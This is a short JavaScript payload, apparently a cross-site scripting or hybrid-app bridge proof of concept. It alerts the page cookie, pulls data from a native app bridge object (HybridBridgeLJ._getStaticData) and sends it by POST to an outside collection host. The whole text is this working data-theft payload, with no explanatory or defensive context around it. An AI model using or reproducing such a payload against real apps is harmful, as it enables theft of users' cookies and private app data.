alert(document.cookie);

var data = window.HybridBridgeLJ._getStaticData();
alert(data);
fetch("http://haku.eyes.sh?beike", {
method: "POST",
body: data
});


